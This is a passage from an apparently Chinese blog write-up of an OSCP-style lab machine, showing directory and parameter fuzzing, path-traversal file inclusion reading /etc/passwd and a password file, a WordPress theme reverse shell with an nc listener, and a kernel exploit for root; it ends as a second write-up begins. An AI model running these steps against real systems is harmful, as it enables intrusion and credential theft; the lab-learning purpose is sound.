class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ dirb http://192.168.80.157 -X .zip,.txt,.                                                                         <br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sat Nov 19 00:53:12 2022<br>URL_BASE: http://192.168.80.157/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>EXTENSIONS_LIST: (.zip,.txt,.) | (.zip)(.txt)(.) [NUM = 3]<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.80.157/ ----<br>+ http://192.168.80.157/secret.txt (CODE:200|SIZE:412)                                                                          <br>                                                                                                                                <br>-----------------<br>END_TIME: Sat Nov 19 00:53:26 2022<br>DOWNLOADED: 13836 - FOUND: 1<br></code></pre></td></tr></table></figure><p>在这里爆出了secret.txt</p><h3 id="查看secret-txt"><a href="#查看secret-txt" class="headerlink" title="查看secret.txt"></a>查看secret.txt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/Documents]<br>└─$ curl http://192.168.80.157/secret.txt<br>Looks like you have got some secrets.<br><br>Ok I just want to <span class="hljs-keyword">do</span> some <span class="hljs-built_in">help</span> to you.<br><br>Do some more fuzz on every page of php <span class="hljs-built_in">which</span> was finded by you. And <span class="hljs-keyword">if</span><br>you get any right parameter <span class="hljs-keyword">then</span> follow the below steps. If you still stuck<br>Learn from here a basic tool with good usage <span class="hljs-keyword">for</span> OSCP.<br><br>https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web<br><br><br><br>//see the location.txt and you will get your next move//<br><br></code></pre></td></tr></table></figure><h3 id="查看提示链接"><a href="#查看提示链接" class="headerlink" title="查看提示链接"></a>查看提示链接</h3><p>在<code>https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</code>这个url中发现</p><p>它提醒我可能存在参数爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">COMMNAD = wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something<br></code></pre></td></tr></table></figure><h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://192.168.80.157/image.php?FUZZ= # -h hide -c 分色 -hc hidecode 隐藏404</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://192.168.80.157/image.php?FUZZ=<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://192.168.80.157/image.php?FUZZ=</span><br><span class="hljs-string">Total requests: 951</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload</span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000001:   200        6 L      12 W       147 Ch      &quot;@&quot;</span><br><span class="hljs-string">000000031:   200        6 L      12 W       147 Ch      &quot;action&quot;</span><br><span class="hljs-string">000000050:   200        6 L      12 W       147 Ch      &quot;agent&quot;</span><br><span class="hljs-string">000000047:   200        6 L      12 W       147 Ch      &quot;adminsql&quot;</span><br><span class="hljs-string">...</span><br><span class="hljs-string">000000947:   200        6 L      12 W       147 Ch      &quot;xyz&quot;</span><br><span class="hljs-string">000000950:   200        6 L      12 W       147 Ch      &quot;zipfiles&quot;</span><br><span class="hljs-string">000000928:   200        6 L      12 W       147 Ch      &quot;windows&quot;</span><br><span class="hljs-string">000000951:   200        6 L      12 W       147 Ch      &quot;zips&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0.487343</span><br><span class="hljs-string">Processed Requests: 951</span><br><span class="hljs-string">Filtered Requests: 0</span><br><span class="hljs-string">Requests/sec.: 1951.396</span><br></code></pre></td></tr></table></figure><p>在这里并没有找到有用参数</p><p>在index.php中找到有意思的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hh 136 http://192.168.80.157/index.php?FUZZ=<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://192.168.80.157/index.php?FUZZ=</span><br><span class="hljs-string">Total requests: 951</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload</span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000341:   200        7 L      19 W       206 Ch      &quot;file&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 951</span><br><span class="hljs-string">Filtered Requests: 950</span><br><span class="hljs-string">Requests/sec.: 0</span><br></code></pre></td></tr></table></figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>直接推测文件包含</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ curl http://192.168.80.157/index.php?file=../../../../../etc/passwd<br>&lt;html&gt;<br>&lt;title&gt;HacknPentest&lt;/title&gt;<br>&lt;body&gt;<br> &lt;img src=<span class="hljs-string">&#x27;hacknpentest.png&#x27;</span> alt=<span class="hljs-string">&#x27;hnp security&#x27;</span> width=<span class="hljs-string">&quot;1300&quot;</span> height=<span class="hljs-string">&quot;595&quot;</span> /&gt;<br>&lt;/body&gt;<br><br>Do something better &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;you are digging wrong file&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>直接包含&#x2F;etc&#x2F;passwd失败</p><p>根据前面的提示选择尝试挖一下location.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ curl http://192.168.80.157/index.php?file=location.txt<br>&lt;html&gt;<br>&lt;title&gt;HacknPentest&lt;/title&gt;<br>&lt;body&gt;<br> &lt;img src=<span class="hljs-string">&#x27;hacknpentest.png&#x27;</span> alt=<span class="hljs-string">&#x27;hnp security&#x27;</span> width=<span class="hljs-string">&quot;1300&quot;</span> height=<span class="hljs-string">&quot;595&quot;</span> /&gt;<br>&lt;/body&gt;<br><br>Do something better &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;ok well Now you reah at the exact parameter &lt;br&gt;&lt;br&gt;Now dig some more <span class="hljs-keyword">for</span> next one &lt;br&gt;use <span class="hljs-string">&#x27;secrettier360&#x27;</span> parameter on some other php page <span class="hljs-keyword">for</span> more fun.<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>对这个参数进行文件包含</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ curl http://192.168.80.157/index.php?secrettier360=../../../../../../../../etc/passwd<br>&lt;html&gt;<br>&lt;title&gt;HacknPentest&lt;/title&gt;<br>&lt;body&gt;<br> &lt;img src=<span class="hljs-string">&#x27;hacknpentest.png&#x27;</span> alt=<span class="hljs-string">&#x27;hnp security&#x27;</span> width=<span class="hljs-string">&quot;1300&quot;</span> height=<span class="hljs-string">&quot;595&quot;</span> /&gt;<br>&lt;/body&gt;<br><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>直接在这个页面行不通</p><p>猜测在image.php中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ curl http://192.168.80.157/image.php?secrettier360=../../../../../../../../etc/passwd<br>&lt;html&gt;<br>&lt;title&gt;HacknPentest&lt;/title&gt;<br>&lt;body&gt;<br> &lt;img src=<span class="hljs-string">&#x27;hacknpentest.png&#x27;</span> alt=<span class="hljs-string">&#x27;hnp security&#x27;</span> width=<span class="hljs-string">&quot;1300&quot;</span> height=<span class="hljs-string">&quot;595&quot;</span> /&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>finaly you got the right parameter&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false<br>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false<br>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false<br>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false<br>syslog:x:104:108::/home/syslog:/bin/false<br>_apt:x:105:65534::/nonexistent:/bin/false<br>messagebus:x:106:110::/var/run/dbus:/bin/false<br>uuidd:x:107:111::/run/uuidd:/bin/false<br>lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false<br>whoopsie:x:109:117::/nonexistent:/bin/false<br>avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false<br>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false<br>dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false<br>colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false<br>speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false<br>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false<br>kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false<br>pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false<br>rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false<br>saned:x:119:127::/var/lib/saned:/bin/false<br>usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false<br>victor:x:1000:1000:victor,,,:/home/victor:/bin/bash<br>mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false<br>saket:x:1001:1001:find password.txt file <span class="hljs-keyword">in</span> my directory:/home/saket:<br>sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>成功文件包含</p><p>并且发现存在敏感信息</p><p><code>saket:x:1001:1001:find password.txt file in my directory:/home/saket:</code></p><p>查看<code>password.txt</code>这个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ curl http://192.168.80.157/image.php?secrettier360=../../../../../../../home/saket/password.txt<br>&lt;html&gt;<br>&lt;title&gt;HacknPentest&lt;/title&gt;<br>&lt;body&gt;<br> &lt;img src=<span class="hljs-string">&#x27;hacknpentest.png&#x27;</span> alt=<span class="hljs-string">&#x27;hnp security&#x27;</span> width=<span class="hljs-string">&quot;1300&quot;</span> height=<span class="hljs-string">&quot;595&quot;</span> /&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>finaly you got the right parameter&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;follow_the_ippsec<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>在这个文件中发现一个密码</p><h3 id="通过ssh尝试登录"><a href="#通过ssh尝试登录" class="headerlink" title="通过ssh尝试登录"></a>通过ssh尝试登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ ssh saket@192.168.80.157<br>saket@192.168.80.157<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">saket@192.168.80.157&#x27;</span>s password:<br><br><br>┌──(neil㉿kali)-[~]<br>└─$ ssh victor@192.168.80.157<br>victor@192.168.80.157<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">victor@192.168.80.157&#x27;</span>s password:<br></code></pre></td></tr></table></figure><p>对存在shell环境的账号均进行了使用follow_the_ippsec这个密码但是都失败了</p><p>推测可能是WordPress后台的密码</p><h3 id="登录WordPress后台"><a href="#登录WordPress后台" class="headerlink" title="登录WordPress后台"></a>登录WordPress后台</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221120173731353.png" alt="发现用户名为victor"></p><p>通过victor:follow_the_ippsec成功登录</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221120173833430.png" alt="image-20221120173833430"></p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>找到后台中可以写入的文件，写入反弹shell的代码</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221120173956593.png" alt="image-20221120173956593"></p><p>开启监听后访问这个路径</p><p><code>http://192.168.80.157/wordpress/wp-content/themes/twentynineteen/secret.php</code></p><p>成功getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ nc -nvlp 443<br>listening on [any] 443 ...<br>connect to [192.168.80.129] from (UNKNOWN) [192.168.80.157] 43928<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (49127): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$<br></code></pre></td></tr></table></figure><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>先随便搜集下信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ip a<br>&lt;ml/wordpress/wp-content/themes/twentynineteen$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:94:ca:6a brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.80.157/24 brd 192.168.80.255 scope global dynamic ens33<br>       valid_lft 1205sec preferred_lft 1205sec<br>    inet6 fe80::e0c7:f2f3:762d:d081/64 scope <span class="hljs-built_in">link</span><br>       valid_lft forever preferred_lft forever<br>www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ <span class="hljs-built_in">whoami</span><br>&lt;ml/wordpress/wp-content/themes/twentynineteen$ <span class="hljs-built_in">whoami</span><br>www-data<br>www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ <span class="hljs-built_in">uname</span> -a<br>&lt;ml/wordpress/wp-content/themes/twentynineteen$ <span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 4.10.0-28-generic <span class="hljs-comment">#32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$<br></code></pre></td></tr></table></figure><p>发现其Linux内核版本挺低的</p><p>搜索内核漏洞</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221120174333067.png" alt="image-20221120174333067"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ searchsploit Linux ubuntu 4.10.0 -m 45010<br>[!] Could not find EDB-ID <span class="hljs-comment">#</span><br><br><br>[!] Could not find EDB-ID <span class="hljs-comment">#</span><br><br><br>  Exploit: Sun SUNWlldap Library Hostname - Local Buffer Overflow<br>      URL: https://www.exploit-db.com/exploits/4<br>     Path: /usr/share/exploitdb/exploits/solaris/local/4.c<br>File Type: C <span class="hljs-built_in">source</span>, ASCII text<br><br>Copied to: /home/neil/4.c<br><br><br>  Exploit: Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation<br>      URL: https://www.exploit-db.com/exploits/45010<br>     Path: /usr/share/exploitdb/exploits/linux/local/45010.c<br>File Type: C <span class="hljs-built_in">source</span>, ASCII text<br><br>Copied to: /home/neil/45010.c<br></code></pre></td></tr></table></figure><p>查看这个提权exp发现</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221120174903194.png" alt="image-20221120174903194"></p><p>只需要gcc编译就能使用</p><h3 id="上传-编译-执行exp"><a href="#上传-编译-执行exp" class="headerlink" title="上传 编译 执行exp"></a>上传 编译 执行exp</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221120175934624.png" alt="成功提权"></p><h3 id="升级shell"><a href="#升级shell" class="headerlink" title="升级shell"></a>升级shell</h3><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221120180323039.png" alt="拿到flag"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考https:<span class="hljs-regexp">//</span>www.bilibili.com<span class="hljs-regexp">/video/</span>BV1yP41177h7打靶<br>这是个挺有意思的靶机<br>主要的突破点还是更加细致的信息收集<br>信息收集决定攻击面在这台靶机上有很好的提现<br>在收集到了secret.txt这个文件后，很多突破都和这个文件有关<br>再之后的wfuzz工具的使用，本质上是对参数进行爆破<br>然后对每个攻击面进行模糊测试，也是很重要的<br>最后提权方面还有些有意思的点，虽然内核提权很简单，但是其实它提供了一个权限配置不当的sudo nopassword的文件<br>可以参考https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/b10d9/</span>p/<span class="hljs-number">13381179</span>.html这个博客<br><br></code></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">最后非内核提权思路是<br>敏感文件搜索 -&gt; 搜到在/opt下有一个backup_pass文件，存有密码，提示<span class="hljs-keyword">enc</span>文件，此处密码用于<span class="hljs-keyword">enc</span>文件<br><span class="hljs-keyword">enc</span>就是那个sudo nopassword的可执行文件<br>之后通过提示 需要先把ippsec进行md5加密，加密后的值用于解密<span class="hljs-keyword">enc</span>.txt<br>根据解密后的内容，获得了saket密码。从www-data用户切换到saket用户。<br>切换到saket用户后，查看下saket用户的权限<br>可以看到saket用户可以执行/home/victor/undefeated_victor<br>最后通过这个文件提权<br></code></pre></td></tr></table></figure><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">最近在学习打靶，首推苑房宏老师的 和我一样来打靶 的课程 https:<span class="hljs-regexp">//</span>www.bilibili.com<span class="hljs-regexp">/video/</span>BV1Lv411n7Lq/，讲的非常清楚<br><br>之后再推一手免费的 https:<span class="hljs-regexp">//</span>space.bilibili.com/<span class="hljs-number">491748397</span> 红队笔记<br><br>这个打靶课也是非常好的，讲的很细节<br><br>再推荐一个up主，最近在打高级靶机的大jb师傅 https:<span class="hljs-regexp">//</span>space.bilibili.com/<span class="hljs-number">1731330412</span><br><br>还有一个师傅 大余安全 https:<span class="hljs-regexp">//</span>space.bilibili.com/<span class="hljs-number">345545189</span> 有部分免费的教程<br></code></pre></td></tr></table></figure><p>最近又有点摆了，还是得 给自己一点压力，每天至少写一篇WP，一段时间后再独立完成靶机！</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sick0s1-1-WP</title>
    <link href="/2022/11/17/Sick0s1-1-WP/"/>
    <url>/2022/11/17/Sick0s1-1-WP/</url>
    
    <content type="html"><![CDATA[<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo arp-scan -l<br>Interface: eth0, <span class="hljs-built_in">type</span>: EN10MB, MAC: 00:0c:29:72:5c:db, IPv4: 192.168.80.129<br>Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.80.1    00:50:56:c0:00:08       VMware, Inc.<br>192.168.80.2    00:50:56:ff:51:55       VMware, Inc.<br>192.168.80.156  00:0c:29:97:da:ab       VMware, Inc.<br>192.168.80.254  00:50:56:f4:07:2b       VMware, Inc.<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.9.7: 256 hosts scanned <span 